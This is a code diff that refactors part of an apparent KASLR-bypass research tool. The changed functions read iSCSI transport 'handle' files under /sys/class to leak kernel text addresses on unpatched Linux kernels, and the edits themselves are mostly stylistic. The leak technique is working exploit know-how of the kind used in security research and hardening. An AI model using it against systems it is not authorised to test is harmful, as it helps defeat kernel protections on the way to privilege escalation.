@@ -61,13 +61,15 @@ KASLD_META("method:parsed\n"
            "patch:v5.12\n"
            "config:CONFIG_SCSI_ISCSI_ATTRS\n");
 
-unsigned long get_kernel_addr_iscsi_iser_transport() {
+static unsigned long get_kernel_addr_iscsi_iser_transport(void) {
   FILE *f;
   char *endptr;
   const char *path = "/sys/class/iscsi_transport/iser/handle";
   int sock_fd;
   unsigned long addr = 0;
-  unsigned int buff_len = 1024;
+  /* Fixed 1024-byte read buffer — constant-sized so the frame stays under
+   * -Wvla / -fstack-protector-strong without dipping into the heap. */
+  enum { buff_len = 1024 };
   char buff[buff_len];
 
   // Try to load the scsi_transport_iscsi and ib_iser modules
@@ -86,14 +88,14 @@ unsigned long get_kernel_addr_iscsi_iser_transport() {
   /* Wait for the module to load and sysfs entries to appear.
    * Poll once per second for up to 5 seconds. */
   for (int wait = 0; wait < 5; wait++) {
-    if (access(path, R_OK) == 0)
+    if (kasld_access(path, R_OK) == 0)
       break;
     sleep(1);
   }
 
   printf("[.] checking %s ...\n", path);
 
-  f = fopen(path, "rb");
+  f = kasld_fopen(path, "rb");
   if (f == NULL) {
     perror("[-] fopen");
     return 0;
@@ -112,23 +114,25 @@ unsigned long get_kernel_addr_iscsi_iser_transport() {
 
   addr = strtoul(buff, &endptr, 10);
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr;
 
   return 0;
 }
 
-unsigned long get_kernel_addr_iscsi_sw_tcp_transport() {
+static unsigned long get_kernel_addr_iscsi_sw_tcp_transport(void) {
   FILE *f;
   char *endptr;
   const char *path = "/sys/class/iscsi_transport/tcp/handle";
   unsigned long addr = 0;
-  unsigned int buff_len = 1024;
+  /* Fixed 1024-byte read buffer — constant-sized so the frame stays under
+   * -Wvla / -fstack-protector-strong without dipping into the heap. */
+  enum { buff_len = 1024 };
   char buff[buff_len];
 
   printf("[.] checking %s ...\n", path);
 
-  f = fopen(path, "rb");
+  f = kasld_fopen(path, "rb");
   if (f == NULL) {
     perror("[-] fopen");
     return 0;
